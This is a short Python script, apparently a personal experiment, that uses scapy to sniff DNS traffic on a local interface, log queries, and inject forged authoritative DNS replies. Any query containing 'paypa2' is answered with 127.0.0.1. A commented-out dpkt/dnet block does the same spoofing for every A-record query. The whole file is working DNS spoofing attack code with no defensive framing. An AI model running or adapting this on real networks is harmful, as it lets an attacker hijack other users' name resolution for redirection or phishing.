#import pcap
#import dpkt
#import dnet
from scapy.all import *



def querysniff(pkt):
	if IP in pkt:
		ip_src = pkt[IP].src
		ip_dst = pkt[IP].dst
		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
			print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
			
	if pkt.haslayer(DNSQR): # DNS question record
		query = pkt[DNS].qd
		if ("paypa2" in query.qname):
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=query, aa = 1, qr=1, \
                      an=DNSRR(rrname=query.qname,  ttl=10, rdata='127.0.0.1'))
			send(spoofed_pkt)
			print 'Sent:', spoofed_pkt.summary()

sniff(iface = "en0",filter = "port 53", prn = querysniff, store = 0)
#sock = dnet.ip()
#pc = pcap.pcap()
#pc.setfilter('udp dst port 53')
#print dir(pc)
#print pc.name
#for timestamp, packet in pc:
#3#		print timesta'mp
"""	eth = dpkt.ethernet.Ethernet(packet)
	ip  = eth.data
	udp = ip.data
	dns = dpkt.dns.DNS(udp.data)
	print dns.qd[0].name
	if dns.qr != dpkt.dns.DNS_Q:
		continue
	if dns.opcode != dpkt.dns.DNS_QUERY:
		continue
	if len(dns.qd) != 1:
		continue
	if len(dns.an) != 0:
		continue
	if len(dns.ns) != 0:
		continue
	if dns.qd[0].cls != dpkt.dns.DNS_IN:
		continue
	if dns.qd[0].type != dpkt.dns.DNS_A:
		continue
	
	dns.op = dpkt.dns.DNS_RA
	dns.rcode = dpkt.dns.DNS_RCODE_NOERR
	dns.qr = dpkt.dns.DNS_R
	arr = dpkt.dns.DNS.RR()
	arr.cls = dpkt.dns.DNS_IN
	arr.type = dpkt.dns.DNS_A
	arr.name = dns.qd[0].name
	arr.ip = dnet.addr('127.0.0.1').ip
	dns.an.append(arr)

	udp.sport, udp.dport = udp.dport, udp.sport
	ip.src, ip.dst = ip.dst, ip.src
	udp.data = dns
	udp.ulen = len(udp)
	ip.len = len(ip)
	print ip
	buf = dnet.ip_checksum(str(ip))
	sock.send(buf)
"""
